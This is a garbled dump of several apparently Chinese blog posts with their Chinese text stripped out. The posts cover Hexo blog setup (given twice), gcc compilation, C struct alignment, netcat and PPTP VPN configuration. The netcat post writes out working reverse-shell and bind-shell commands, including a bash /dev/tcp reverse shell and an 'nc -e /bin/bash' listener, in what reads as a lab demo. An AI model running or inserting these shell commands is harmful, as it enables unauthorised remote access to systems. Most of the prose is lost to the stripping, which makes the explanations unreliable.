Post.title: Hello world
Post._content:
Hexo and NexT on Github ...
==============

------   
> ,--->.hexo,github,....

****  
1. [Hexo.io:https://hexo.io/zh-cn/docs/](https://hexo.io/zh-cn/docs/ "Hexo")  
2. [Next:http://theme-next.iissnan.com/theme-settings.html](http://theme-next.iissnan.com/theme-settings.html "Next")  
3. [:http://ibruce.info/2013/11/22/hexo-your-blog/](http://ibruce.info/2013/11/22/hexo-your-blog/ "")  
4. [bubukoo:http://bubkoo.com/2013/12/16/hexo-issure/](http://bubkoo.com/2013/12/16/hexo-issure/ "tags..")  
5. [tags:http://www.cnblogs.com/debugzer0/articles/5461804.html](http://www.cnblogs.com/debugzer0/articles/5461804.html)  
6. [:http://crazymilk.github.io/2015/12/28/GitHub-Pages-Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/](http://crazymilk.github.io/2015/12/28/GitHub-Pages-Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/)

---

# (,github~_~Windows,nodejsmsi)  


**Node.js**  
	Wget:  
	`$ wget -qO- https://raw.github.com/creationix/nvm/master/install.sh | sh`  
	  
	`$ nvm install stable`  
**Hexo**  
	`$ npm install hexo-cli -g#hexo`   
****(githubusername.github.io(com))
```bash
	$ hexo init username.github.io#(username)git remote addgithub,  
	$ cd username.github.io#   
	$ npm install#npm,  
	$ hexo g#,hexo g -d  
	$ hexo s #http://localhost:4000,github  
	$ hexo d#github,username.github.io_config.yml  
    #
    npm install hexo-generator-index --save
	npm install hexo-generator-archive --save
	npm install hexo-generator-category --save
	npm install hexo-generator-tag --save
	npm install hexo-server --save
	npm install hexo-deployer-git --save
	npm install hexo-deployer-heroku --save
	npm install hexo-deployer-rsync --save
	npm install hexo-deployer-openshift --save
	npm install hexo-renderer-marked@0.2 --save
	npm install hexo-renderer-stylus@0.2 --save
	npm install hexo-generator-feed@1 --save
	npm install hexo-generator-sitemap@1 --save
	npm install hexo-generator-searchdb --save    #
	npm install --save hexo-generator-index
	npm install --save hexo-generator-archive 
	npm install --save hexo-generator-tag

```  

> ,`hexo clean; rm -rf .deploy_git; hexo g`.  

#   
`google,github,https,`()   
![github](/images/git.png)
#   
``[https://hexo.io/themes/index.html](https://hexo.io/themes/index.html "theme"),`Nextpacman.  `  
#    
`()`**hexo new page "tags"**`MarkDown.`

==============

------

****  
1. [Hexo.io:https://hexo.io/zh-cn/docs/](https://hexo.io/zh-cn/docs/ "Hexo")  
2. [Next:http://theme-next.iissnan.com/theme-settings.html](http://theme-next.iissnan.com/theme-settings.html "Next")  
3. [:http://ibruce.info/2013/11/22/hexo-your-blog/](http://ibruce.info/2013/11/22/hexo-your-blog/ "")  
4. [bubukoo:http://bubkoo.com/2013/12/16/hexo-issure/](http://bubkoo.com/2013/12/16/hexo-issure/ "tags..")  
5. [tags:http://www.cnblogs.com/debugzer0/articles/5461804.html](http://www.cnblogs.com/debugzer0/articles/5461804.html)  
6. [:http://crazymilk.github.io/2015/12/28/GitHub-Pages-Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/](http://crazymilk.github.io/2015/12/28/GitHub-Pages-Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/)

---

# (,github~_~Windows,nodejsmsi)  


**Node.js**  
	Wget:  
	`$ wget -qO- https://raw.github.com/creationix/nvm/master/install.sh | sh`  
	  
	`$ nvm install stable`  
**Hexo**  
	`$ npm install hexo-cli -g#hexo`   
****(githubusername.github.io(com))
```bash
	$ hexo init username.github.io#(username)git remote addgithub,  
	$ cd username.github.io#   
	$ npm install#npm,  
	$ hexo g#,hexo g -d  
	$ hexo s #http://localhost:4000,github  
	$ hexo d#github,username.github.io_config.yml  
    #
    npm install hexo-generator-index --save
	npm install hexo-generator-archive --save
	npm install hexo-generator-category --save
	npm install hexo-generator-tag --save
	npm install hexo-server --save
	npm install hexo-deployer-git --save
	npm install hexo-deployer-heroku --save
	npm install hexo-deployer-rsync --save
	npm install hexo-deployer-openshift --save
	npm install hexo-renderer-marked@0.2 --save
	npm install hexo-renderer-stylus@0.2 --save
	npm install hexo-generator-feed@1 --save
	npm install hexo-generator-sitemap@1 --save
	npm install hexo-generator-searchdb --save    #
	npm install --save hexo-generator-index
	npm install --save hexo-generator-archive 
	npm install --save hexo-generator-tag

```  

> ,`hexo clean; rm -rf .deploy_git; hexo g`.  

#   
`google,github,https,`()   
![github](/images/git.png)
#   
``[https://hexo.io/themes/index.html](https://hexo.io/themes/index.html "theme"),`Nextpacman.  `  
#    
`()`**hexo new page "tags"**`MarkDown.`
Post.content:
Hexo and NexT on Github

,>.hexo,github,.

  1. Hexo.io:https://hexo.io/zh-cn/docs/
  2. Next:http://theme-next.iissnan.com/theme-settings.html
  3. :http://ibruce.info/2013/11/22/hexo-your-blog/
  4. bubukoo:http://bubkoo.com/2013/12/16/hexo-issure/
  5. tags:http://www.cnblogs.com/debugzer0/articles/5461804.html
  6. :http://crazymilk.github.io/2015/12/28/GitHub-Pages-Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/

(,github~_~Windows,nodejsmsi)

Node.js
Wget:
$ wget -qO- https://raw.github.com/creationix/nvm/master/install.sh | sh

$ nvm install stable
Hexo
$ npm install hexo-cli -g#hexo
(githubusername.github.io(com))

$ hexo init username.github.io#(username)git remote addgithub,  
$ cd username.github.io#   
$ npm install#npm,  
$ hexo g#,hexo g -d  
$ hexo s #http://localhost:4000,github  
$ hexo d#github,username.github.io_config.yml  
#
npm install hexo-generator-index --save
npm install hexo-generator-archive --save
npm install hexo-generator-category --save
npm install hexo-generator-tag --save
npm install hexo-server --save
npm install hexo-deployer-git --save
npm install hexo-deployer-heroku --save
npm install hexo-deployer-rsync --save
npm install hexo-deployer-openshift --save
npm install hexo-renderer-marked@0.2 --save
npm install hexo-renderer-stylus@0.2 --save
npm install hexo-generator-feed@1 --save
npm install hexo-generator-sitemap@1 --save
npm install hexo-generator-searchdb --save    #
npm install --save hexo-generator-index
npm install --save hexo-generator-archive 
npm install --save hexo-generator-tag

,hexo clean; rm -rf .deploy_git; hexo g.

google,github,https,()

https://hexo.io/themes/index.html,Nextpacman.

()hexo new page tagsMarkDown.

Post.title: C
Post._content:
> CVTELinuxbootC.ubuntu 16.04 i386

---

# gcc
![gcc_program](/images/gcc_program.png)

****.i.s.oLinuxelfWindowsPE`gcc sources -o target`gcc`++a`
```C
#include <stdio.h>

#define F(x) ((x)*(x))
void main(void)
{
	int a = 4;
	//printf("%d\n", F(++a));
	printf("%d\n", F(a++));
}
```

# 
****CC++**const**
![compile](/images/compile.png)

```C
gcc -E mocro_define.c -o mocro_define.i
```
![define_E](/images/define_E.png)
.idefinegcc.i800

# 
`-masm=intel`intelAT&Tintel
```C
gcc -S mocro_define.i -o mocro_define.s -masm=intel
```
![define_S](/images/define_S.png)
.4`[ebp-12]`,a`edx``lea``a++`a`a++``imul``edx``eax`4\*5,`ecx`6(a)`eax``call printf``a++``a++`
![define_S_main](/images/define_S_main.png)

# 

```C
gcc -c mocro_define.s -o mocro_define.o
```
![define_c](/images/define_c.png)
readelfgccasasasm
# 

```C
gcc mocro_define.o -o mocro_define
./mocro_define
```
![define_o](/images/define_o.png)
gccld

# 
C****,C

Post.title: memory_align
Post._content:
## C/C++()  

---

> (C99,C11)[stackoverflow](http://stackoverflow.com/ "Stack Overflow")

---
  
[](https://en.wikipedia.org/wiki/Data_structure_alignment#Problems "")
[StackOverflow GCC Structure](http://stackoverflow.com/questions/2554229/memory-alignment-within-gcc-structs)
[GCC](https://gcc.gnu.org/onlinedocs/gcc/Type-Attributes.html)
### 1. PC:  
#### 32
      char 1
      char*: 4322^32, 32bit464
      short int : 2
      int  4
      unsigned int : 4
      float:  4
      double:   8
      long:   4
      long long:  8
      unsigned long:  4
#### 64
      char 1
      char* (): 8
      short int : 2
      int  4
      unsigned int : 4
      float:  4
      double:   8
      long:   8
      long long:  8
      unsigned long:  8  
()(80861620CPU).(CPU)Csizeof(type)sizeofsizeof

---

### 2. ()  
#### 1. (char<1>int<PC4>)****#pragma packn)n8n1,2,4,82.  
#### 2. ****#pragma pack (n)n,  

> ()****G(8)"""1""0"CPU``PCServer()

### 3. Win
#### 1. WinVC++ 6.0
![](/images/1.png)
#### 2. intb4a
![int b](/images/2.png)
#### 3. int()
![](/images/3.png)
#### 4. 
![](/images/4.png)
#### 5. char()
![char](/images/5.png)
#### 6. #pragma pack (n) n2
![#pragma pack (n)](/images/6.png)
#### 7. 8
![struct](/images/7.png)
#### 8. pragma pack (3)
![pack (3)](/images/8.png)

### 4. Linux(gcc4 bytes)
#### 1. ubuntu 16.04 amd64 sshubuntu 16.04 i386gcc:
![gcc -v](/images/gcc-st-1.png)
#### 2. 4int4
![4 butys](/images/gcc-st-2.png)
#### 3. gccpragma pack__attribute__1CPU...
![attri_1](/images/gcc-st-3.png)
#### 4. a,shortint4__attribute__~
![attri_2](/images/gcc-st-4.png)
#### 5. pack1~~~
![pack_1](/images/gcc-st-5.png)
#### 6. foodouble8412bard?(double,char 8char)4short12
![st_to_st](/images/gcc-st-6.png)
#### 7. 1bar4
![st_to_aligned(1)](/images/gcc-st-7.png)
### 5. C++
> CC++developerbug****``py  

#### 1.C++
C++()[](http://weibo.com/p/230418e682a92a0102w5wl?mod=zwenzhang).C++classprivateconst``CPU~_~(intel 8086286).

#### 2. C++class
C++()4(32OS)(),thisVC++intel ecxthis(`obj.func(a, b, c);`)(`func(&obj, a, b, c);`),....

---
GNU/Linux~_~

C/C++()

(C99,C11)stackoverflow



StackOverflow GCC Structure
GCC

1. PC:

32

char 1
char*: 4322^32, 32bit464

Post.title: NetCat
Post._content:
:
[http://netcat.sourceforge.net/](http://netcat.sourceforge.net/)
[gnucitizen.org](http://www.gnucitizen.org/blog/reverse-shell-with-bash/)
[http://www.oschina.net/translate/linux-netcat-command](http://www.oschina.net/translate/linux-netcat-command)
[Reverse shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
[NetCat for windows](https://joncraton.org/blog/46/netcat-for-windows/)

---

# 1. nc
....  
netcat\*nixshell`man nc`Linux(| > < >> <<)

---
# 2. :
ncnmap
## 1. :
sshLinux`nc -l 8888``nc -n 10.128.54.118 8888`.-l8888"0.0.0.0",-nIPDNS.
![nc_liaotian](/images/nc_liaotian.png)

## 2.shell(reverse shell)
shell`nc -l -v -p 8888`,`bash -i >& /dev/tcp/10.128.54.118/8888 0>&1`.Bingo!!!,shell.bash -ibash,tcp\*nixOS,`>``&`shellLinux0,1,2bash`>``0>&1`.
![Reverse_shell](/images/nc_reverse_shell.png)
shell[](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet),Bash,Perl,Python,PHP,Ruby,Netcat,Java.:
```bash
$exec 3<>/dev/tcp/10.128.54.118/8888#3
$cat <&3 | while read line; do $line >&3 2>&1; done#cat3whilewhilecat3
```


## 3. shell(bind shell)
Server
```bash
$nc -l port -e /bin/bash -i
```
Client
```bash
$nc server_ip port 
```
BSDnetcat-e-c:
```bash
$mkfifo /tmp/tmp_fifo
$cat /tmp/tmp_fifo | /bin/bash -i 2>&1 | nc -l port > /tmp/tmp_fifo
```
![bind_shell](/images/nc_bind_shell.png)

## 4. 
ftp,smbnctar

Sender:
```bash
$nc -l Port < file
```

Receiver:
```bash
$nc IP Port > file
```
![file_send](/images/nc_file_send.png)
demo

---

# 3. 
\*nixnc...

Post.title: VPN
Post._content:
:  
[https://www.nigesb.com/setup-your-own-vpn-with-pptp.html](https://www.nigesb.com/setup-your-own-vpn-with-pptp.html)
`sudo apt-get install pptpd`  
/etc/pptpd.conf    
`localip 10.0.0.1`
`remoteip 10.0.0.100-200`


/etc/ppp/pptpd-options.pptpd

`ms-dns 202.96.128.86`
`ms-dns 202.96.128.166`

/etc/ppp/chap-secrets
ip


/etc/sysctl.conf

`net.ipv4.ip_forward = 1`


`sysctl -p`




`iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE`
`iptables -A FORWARD -p tcp --syn -s 10.0.0.0/24 -j TCPMSS --set-mss 1356`
`iptables-save`




Debian-6 32-bit

iptablesiptablesiptables -Fiptables

1./etc/iptables()

2./etc/network/if-pre-up.d/iptables
`root@hostname:~# touch /etc/network/if-pre-up.d/iptables`
`root@hostname:~# chmod +x /etc/network/if-pre-up.d/iptables`

3./etc/network/if-pre-up.d/iptables
```bash
#!/bin/sh
 /sbin/iptables-restore < /etc/iptables
 ```
 4.iptablesiptables/etc/iptables
 root@hostname:~# iptables-save > /etc/iptables

 //openvpn
 http://www.zhengyali.com/?p=52
 http://www.zhengyali.com/?p=66
 http://blog.csdn.net/brad_chen/article/details/49633491
 http://openvpn.ustc.edu.cn/




 openvpn



 `sudo apt-get purge openvpn liblzo2-2`
 `sudo apt-get install openvpn`
